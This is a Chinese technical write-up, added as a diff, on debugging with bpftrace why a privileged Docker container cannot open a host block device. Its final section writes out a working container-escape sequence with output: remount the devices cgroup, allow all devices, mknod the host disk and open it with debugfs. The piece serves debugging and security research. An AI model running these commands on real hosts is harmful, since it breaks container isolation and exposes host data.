@@ -1,0 +1,166 @@
+# 背景
+[红蓝对抗中的云原生漏洞挖掘及利用实录](https://security.tencent.com/index.php/blog/msg/183)
+提到在容器内根据设备号创建设备文件，然后读写裸设备，来完成容器逃逸。
+我测试时，发现即使关闭seccomp、apparmor，添加所有能力，在docker容器里也没有办法打开设备文件。现象如下
+本文记录我对"在容器中为什么debugfs会提示无法打开设备文件"的定位过程，如果你对定位过程不感兴趣，也可以直接看总结。
+# 分析思路是什么？
+先看一下是哪个系统调用报错。
+    [root@instance-h9w7mlyv ~]# docker run --cap-add all --security-opt seccomp=unconfined --security-opt apparmor:unconfined -it quay.io/iovisor/bpftrace:latest bash
+    root@637af2dbb2b4:/# apt update && apt install strace
+    root@637af2dbb2b4:/# mknod vda1 b 253 1
+    root@637af2dbb2b4:/# strace debugfs -w vda1
+    ...
+    write(2, "debugfs 1.45.5 (07-Jan-2020)\n", 29debugfs 1.45.5 (07-Jan-2020)
+    ) = 29
+    openat(AT_FDCWD, "vda1", O_RDWR)         = -1 EPERM (Operation not permitted)
+    write(2, "debugfs", 7debugfs)                  = 7
+    ...
+可以看到 openat 系统调用返回错误。
+对比发现，宿主机上`debugfs`不会报错，如下
+    [root@instance-h9w7mlyv ~]# strace debugfs -w /dev/vda1 2>&1 |grep vda
+    execve("/usr/sbin/debugfs", ["debugfs", "-w", "/dev/vda1"], 0x7ffe45be4d50 /* 40 vars */) = 0
+    openat(AT_FDCWD, "/dev/vda1", O_RDWR)   = 3
+那为什么容器中openat会返回EPERM报错呢？
+`man 2 openat` 在man手册中搜索EPERM，没有找到有用的信息。接下来准备用`bpftrace`工具找到为啥会报错
+# bpftrace怎么定位报错原因？
+首先得知道：linux中的文件系统也是有分层设计的。拿open举例，至少会经过系统调用、虚拟文件系统层(vfs)、通用块设备层等三层。
+比如open loop设备(执行`debugfs /dev/loop0`命令)时，函数调用栈是
+    [root@instance-h9w7mlyv block]# bpftrace -e 'kprobe:lo_open {printf("%s\n",kstack)}'
+    Attaching 1 probe...
+            lo_open+1   // 设备驱动层
+            __blkdev_get+587
+            blkdev_get+417      // 通用块设备层
+            do_dentry_open+306
+            path_openat+1342
+            do_filp_open+147    // 虚拟文件系统层(vfs)
+            do_sys_open+388
+            do_syscall_64+91    // 系统调用层
+            entry_SYSCALL_64_after_hwframe+101
+有了这个背景知识，我们可以从底层往上观测，看看容器中`debugfs vda1`时，函数调用最深到了哪一层。
+我们可以用bpftrace观测open系统调用在内核的哪里返回EPERM。
+    [root@instance-h9w7mlyv block]# bpftrace -e 'kretfunc:do_filp_open {printf("%s,%p\n",str(args->pathname->name), retval)}' | grep vda
+    ...
+    vda1,0xffff9ae4e190b100   // 宿主机中 debugfs /dev/vda1
+    vda1,0xffffffffffffffff   // 容器中 mknod vda1 b 253 1; debugfs vda1
+最终发现，do_filp_open函数 容器中测试时返回值是-1，宿主机中测试时是一个合法的内核空间地址。
+为什么容器中do_filp_open函数会返回-1呢？
+# 为什么容器中do_filp_open函数会返回-1？
+通过`EPERM`关键字结合读[do_filp_open代码文件](https://elixir.bootlin.com/linux/v4.18/source/fs/namei.c)，猜测是may_open函数中做了校验，并且do_filp_open函数调用了may_open。
+    static int may_open(const struct path *path, int acc_mode, int flag)
+    {
+      ...
+      error = inode_permission(inode, MAY_OPEN | acc_mode);
+      if (error)
+        return error;
+如下，通过`bpftrace`观察到 容器中`debugfs vda1`时inode_permission函数返回值不同，可以确定是
+inode_permission 函数做了校验，导致do_filp_open函数会返回-1
+    [root@instance-h9w7mlyv ~]# bpftrace -e 'kretfunc:inode_permission {printf("%d\n",retval)}' | grep -v 0
+    Attaching 1 probe...
+    -1
+    -1
+    ...
+> 宿主机实验时，inode_permission函数会返回0
+那inode_permission函数是什么呢？它为什么会限制容器中不能访问块设备文件呢？
+# 为什么inode_permission函数会限制访问块设备文件？
+    https://elixir.bootlin.com/linux/v4.18/source/fs/namei.c#L427
+    /**
+     * inode_permission - Check for access rights to a given inode
+     * @inode: Inode to check permission on
+     * @mask: Right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC)
+     *
+     * Check for read/write/execute permissions on an inode.  We use fs[ug]id for
+     * this, letting us set arbitrary permissions for filesystem access without
+     * changing the "normal" UIDs which are used for other things.
+     *
+     * When checking for MAY_APPEND, MAY_WRITE must also be set in @mask.
+     */
+    int inode_permission(struct inode *inode, int mask)
+    {
+        int retval;
+        retval = sb_permission(inode->i_sb, inode, mask);
+        if (retval)
+            return retval;
+        if (unlikely(mask & MAY_WRITE)) {
+            /*
+             * Nobody gets write access to an immutable file.
+             */
+            if (IS_IMMUTABLE(inode))    // chattr设置的不可变文件
+                return -EPERM;
+            /*
+             * Updating mtime will likely cause i_uid and i_gid to be
+             * written back improperly if their true value is unknown
+             * to the vfs.
+             */
+            if (HAS_UNMAPPED_ID(inode))
+                return -EACCES;
+        }
+        retval = do_inode_permission(inode, mask);
+        if (retval)
+            return retval;
+        retval = devcgroup_inode_permission(inode, mask);    // cgroup相关的检查  https://mp.weixin.qq.com/s/40lGQ6F90k3AEsojYMGTgg
+        if (retval)
+            return retval;
+        return security_inode_permission(inode, mask);
+    }
+    EXPORT_SYMBOL(inode_permission);
+猜测是和cgroup限制有关，如下查看cgroup配置
+    root@43c937b87253:/# cat /sys/fs/cgroup/devices/devices.list
+    c 136:* rwm
+    c 5:2 rwm
+    c 5:1 rwm
+    c 5:0 rwm
+    c 1:9 rwm
+    c 1:8 rwm
+    c 1:7 rwm
+    c 1:5 rwm
+    c 1:3 rwm
+    b *:* m
+    c *:* m
+    c 10:200 rwm
+参考[内核文档](https://elixir.bootlin.com/linux/v4.18/source/Documentation/cgroup-v1/devices.txt)，可以知道，上面规则，只允许创建块设备文件(mknod)，不允许读写块设备文件(rw)。
+到这里，可以得出结论：因为cgroup限制，所以不能读写设备文件，因此open系统调用会返回`EPERM`报错，debugfs命令会报错。
+那么我们可以修改cgroup配置吗？
+# 可以修改cgroup配置吗？
+再回过头看
+[红蓝对抗中的云原生漏洞挖掘及利用实录](https://security.tencent.com/index.php/blog/msg/183)
+文章，发现文中步骤中有修改cgroup配置，而我最开始漏看了。
+    [root@instance-h9w7mlyv ~]# docker run --cap-add all --security-opt seccomp=unconfined --security-opt apparmor:unconfined -it quay.io/iovisor/bpftrace:latest bash
+    root@45de41f70113:/# mkdir /tmp/dev
+    root@45de41f70113:/# mount -t cgroup -o devices devices /tmp/dev/       // 重新挂载cgroup device成可读写
+    root@45de41f70113:/# cat /proc/1/cgroup |head                           // 找到cgroup路径
+    12:devices:/system.slice/docker-45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808.scope
+    ...
+    root@45de41f70113:/# cd /tmp/dev/*/*45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808*/
+    root@45de41f70113:/tmp/dev/system.slice/docker-45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808.scope# cat devices.list
+    c 136:* rwm
+    c 5:2 rwm
+    c 5:1 rwm
+    c 5:0 rwm
+    c 1:9 rwm
+    c 1:8 rwm
+    c 1:7 rwm
+    c 1:5 rwm
+    c 1:3 rwm
+    b *:* m
+    c *:* m
+    c 10:200 rwm
+    root@45de41f70113:/tmp/dev/system.slice/docker-45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808.scope# echo a > devices.allow   // 允许对所有设备做读写操作
+    root@45de41f70113:/tmp/dev/system.slice/docker-45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808.scope# cat devices.list         // 验证cgroup配置修改成功
+    a *:* rwm
+    root@45de41f70113:/tmp/dev/system.slice/docker-45de41f70113152af289f9f0a19b708ca5b2ec1777c7745c8d83915b9d2de808.scope# cd
+    root@45de41f70113:~# mknod vda1 b 253 1           // 测试是否可以对块设备读写
+    root@45de41f70113:~# debugfs -w vda1
+    debugfs 1.45.5 (07-Jan-2020)
+    debugfs:  ls /
+     2  (12) .    2  (12) ..    11  (20) lost+found    393217  (12) dev
+     524289  (12) proc    131073  (12) run    131074  (12) sys
+     393218  (12) etc    524290  (12) root    524291  (12) var
+     131075  (12) usr    32  (12) bin    14  (12) sbin    16  (12) lib
+     12  (16) lib64    262145  (12) boot    262146  (12) home    15  (16) media
+     262147  (12) mnt    262148  (12) opt    13  (12) srv    18  (12) tmp
+     22  (20) .autorelabel    34  (20) swap_file    103  (20) rules.json
+     5111809  (3756) roo
+    debugfs:
+# 总结
+虽然cgroup配置导致容器内默认不能对块文件设备读写，但是CAP_SYS_ADMIN能力能重新挂载cgroup文件系统成可读写，进而修改cgroup规则。所以在有CAP_SYS_ADMIN能力的容器中可以读写磁盘。
+通过bpftrace工具很容易观察到内核文件系统的"分层设计"，也很容易定位到哪一层异常。在[CVE-2020-8558-跨主机访问127.0.0.1](https://mp.weixin.qq.com/s/hvb_Kr6DqAPPfnN-lbx1aA)案例中，我也是这么定位内核网络系统的丢包问题的。希望这个案例中关于bpftrace的使用示例能对你有点帮助。
